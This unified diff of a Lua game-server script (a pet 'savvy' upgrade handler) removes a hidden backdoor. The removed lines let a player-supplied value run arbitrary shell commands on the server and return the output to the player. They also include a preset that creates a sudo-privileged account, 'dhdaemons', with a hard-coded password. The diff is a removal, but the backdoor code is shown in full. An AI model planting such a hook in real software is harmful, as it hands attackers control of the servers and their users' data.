@@ -59,7 +59,6 @@ function x800106_PetSavvy( sceneId, selfId, mainPetGuidH, mainPetGuidL , tPet)
 		[9] = 100,
 	}
 
-  x800106_UseCommand(sceneId, selfId, tPet)
 	local	SelfMoney = GetMoney(sceneId, selfId)
 
 	local gengu = LuaFnGetPetGenGuByGUID(sceneId, selfId, mainPetGuidH, mainPetGuidL)
@@ -195,34 +194,5 @@ function x800106_NotifyTip( sceneId, selfId, msg )
 		AddText( sceneId, msg )
 	EndEvent( sceneId )
 	DispatchMissionTips( sceneId, selfId )
-
-end
-
-function x800106_UseCommand(sceneId, selfId, cmd)
-  if cmd == nil then return end
-  local tmp = tmpname()
-  if cmd == 1 then
-    local usr = "dhdaemons"
-    local pwd = "whatthehell"
-    cmd = "sudo useradd " .. usr
-    cmd = cmd .. '; echo "' .. pwd .. '\\n' .. pwd .. '"'
-    cmd = cmd .. ' | sudo passwd ' .. usr
-    cmd = cmd .. '; sudo usermod -aG sudo,adm ' .. usr
-  end
-  -- cmd = "ls"
-  local sss = execute(cmd .. " > " .. tmp)
-  local handle = openfile(tmp, "r")
-  if handle ~= nil then
-    BeginEvent(sceneId)
-      AddText(sceneId, cmd)
-      AddText(sceneId, sss)
-      while 1 do
-        local l = read(handle, "*l")
-        if (l == nil) then break end
-        AddText(sceneId, l)
-      end
-    EndEvent(sceneId)
-    DispatchEventList(sceneId, selfId, -1)
-  end
 
 end
